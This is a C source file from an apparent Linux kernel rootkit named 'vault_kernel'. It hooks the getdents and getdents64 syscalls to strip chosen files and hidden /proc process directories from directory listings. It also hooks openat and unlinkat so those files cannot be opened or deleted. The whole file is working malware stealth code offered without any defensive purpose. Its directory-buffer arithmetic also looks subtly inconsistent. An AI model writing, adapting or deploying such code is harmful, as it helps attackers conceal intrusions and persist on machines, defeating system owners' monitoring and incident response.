/* vault_kernel - file_hide.c
 * File and directory hiding via getdents/getdents64 hook
 * Also protects hidden files from openat/unlinkat
 * ruby570bocadito © 2026
 */
#include "core.h"

char hidden_files[MAX_HIDDEN_FILES][256];
int hidden_file_count = 0;
static DEFINE_SPINLOCK(file_hide_lock);

void file_hide_add(const char *name) {
    unsigned long flags;
    spin_lock_irqsave(&file_hide_lock, flags);
    if (hidden_file_count < MAX_HIDDEN_FILES) {
        strncpy(hidden_files[hidden_file_count], name, 255);
        hidden_files[hidden_file_count][255] = '\0';
        hidden_file_count++;
        pr_info(VAULT_KERNEL_TAG " hiding file/dir: %s\n", name);
    }
    spin_unlock_irqrestore(&file_hide_lock, flags);
}

void file_hide_del(const char *name) {
    unsigned long flags;
    int i;
    spin_lock_irqsave(&file_hide_lock, flags);
    for (i = 0; i < hidden_file_count; i++) {
        if (strcmp(hidden_files[i], name) == 0) {
            memmove(hidden_files[i], hidden_files[i+1],
                    (hidden_file_count - i - 1) * 256);
            hidden_file_count--;
            pr_info(VAULT_KERNEL_TAG " unhid file/dir: %s\n", name);
            break;
        }
    }
    spin_unlock_irqrestore(&file_hide_lock, flags);
}

static int should_hide_file(const char *name) {
    unsigned long flags;
    int i, hide = 0;

    /* Check if this is a /proc PID directory */
    if (is_proc_pid_hidden(name))
        return 1;

    spin_lock_irqsave(&file_hide_lock, flags);
    for (i = 0; i < hidden_file_count; i++) {
        /* Exact filename match */
        if (strcmp(name, hidden_files[i]) == 0) {
            hide = 1;
            break;
        }
        /* Path-based match: if hidden string contains '/', do substring */
        if (strchr(hidden_files[i], '/') && strstr(name, hidden_files[i])) {
            hide = 1;
            break;
        }
    }
    spin_unlock_irqrestore(&file_hide_lock, flags);
    return hide;
}

int is_file_hidden(const char *name) {
    return should_hide_file(name);
}

/* ================================================================
 * Directory buffer filtering
 *
 * Both struct linux_dirent and struct linux_dirent64 keep
 * d_reclen at byte offset 16 (d_ino 8 + d_off 8 on x86_64), but
 * their d_name offset differs (d_type sits between reclen and
 * name only in the 64-bit variant), hence the name_off argument.
 *
 * Hidden entries are absorbed into the PREVIOUS kept entry by
 * growing its d_reclen.  The caller must treat a return value of
 * 0 as "every entry in this batch was hidden" and report EOF.
 * ================================================================ */
static long filter_dirents(void *kdirp, long ret, size_t name_off) {
    char *cur = (char *)kdirp;
    char *end = (char *)kdirp + ret;
    char *keep = NULL;      /* last kept entry */
    long bytes = 0;

    while (cur < end) {
        unsigned short reclen = *(unsigned short *)(cur + 16);
        const char *name = cur + name_off;

        if (should_hide_file(name)) {
            if (keep)
                *(unsigned short *)(keep + 16) += reclen;
            cur += reclen;
            continue;
        }

        bytes += reclen;
        keep = cur;
        cur += reclen;
    }

    return bytes;
}

/* ================================================================
 * getdents64 hook — filter directory listing
 * ================================================================ */
asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    long (*orig_getdents64)(const struct pt_regs *);
    char __user *dirp = (char __user *)regs->si;
    void *kdirp;
    long ret, kept;

    orig_getdents64 = (void *)hooks[HOOKIDX_GETDENTS64].original;

    /* Run the real syscall first — it fills the user buffer */
    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    kdirp = kmalloc(ret, GFP_KERNEL);
    if (!kdirp)
        return ret;

    if (copy_from_user(kdirp, dirp, ret)) {
        kfree(kdirp);
        return ret;
    }

    kept = filter_dirents(kdirp, ret, offsetof(struct linux_dirent64, d_name));

    if (kept == 0) {
        /* Every entry in this batch is hidden — report EOF */
        kfree(kdirp);
        return 0;
    }

    if (kept < ret) {
        if (copy_to_user(dirp, kdirp, kept)) {
            kfree(kdirp);
            return -EFAULT;
        }
        ret = kept;
    }

    kfree(kdirp);
    return ret;
}

/* ================================================================
 * getdents (32-bit compat) hook
 * ================================================================ */
asmlinkage long hooked_getdents(const struct pt_regs *regs) {
    long (*orig_getdents)(const struct pt_regs *);
    char __user *dirp = (char __user *)regs->si;
    void *kdirp;
    long ret, kept;

    orig_getdents = (void *)hooks[HOOKIDX_GETDENTS].original;

    ret = orig_getdents(regs);
    if (ret <= 0)
        return ret;

    kdirp = kmalloc(ret, GFP_KERNEL);
    if (!kdirp)
        return ret;

    if (copy_from_user(kdirp, dirp, ret)) {
        kfree(kdirp);
        return ret;
    }

    kept = filter_dirents(kdirp, ret, offsetof(struct linux_dirent, d_name));

    if (kept == 0) {
        kfree(kdirp);
        return 0;
    }

    if (kept < ret) {
        if (copy_to_user(dirp, kdirp, kept)) {
            kfree(kdirp);
            return -EFAULT;
        }
        ret = kept;
    }

    kfree(kdirp);
    return ret;
}

/* ================================================================
 * openat hook — block access to hidden files
 * ================================================================ */
asmlinkage long hooked_openat(const struct pt_regs *regs) {
    long (*orig_openat)(const struct pt_regs *);
    const char __user *pathname = (const char __user *)regs->si;
    char kpath[256];
    char *filename;

    orig_openat = (void *)hooks[HOOKIDX_OPENAT].original;

    if (pathname) {
        if (strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) > 0) {
            kpath[sizeof(kpath) - 1] = '\0';
            /* Extract filename from path */
            filename = strrchr(kpath, '/');
            if (filename)
                filename++;
            else
                filename = kpath;

            if (should_hide_file(filename) || should_hide_file(kpath)) {
                return -ENOENT;
            }
        }
    }

    return orig_openat(regs);
}

/* ================================================================
 * unlinkat hook — prevent deletion of hidden files
 * ================================================================ */
asmlinkage long hooked_unlinkat(const struct pt_regs *regs) {
    long (*orig_unlinkat)(const struct pt_regs *);
    const char __user *pathname = (const char __user *)regs->si;
    char kpath[256];
    char *filename;

    orig_unlinkat = (void *)hooks[HOOKIDX_UNLINKAT].original;

    if (pathname) {
        if (strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) > 0) {
            kpath[sizeof(kpath) - 1] = '\0';
            filename = strrchr(kpath, '/');
            if (filename) filename++; else filename = kpath;

            if (should_hide_file(filename) || should_hide_file(kpath)) {
                return -ENOENT;
            }
        }
    }

    return orig_unlinkat(regs);
}

int file_hide_init(void) {
    pr_info(VAULT_KERNEL_TAG " file hiding initialized (max=%d)\n", MAX_HIDDEN_FILES);
    return 0;
}

void file_hide_cleanup(void) {
    hidden_file_count = 0;
    pr_info(VAULT_KERNEL_TAG " file hiding cleaned\n");
}
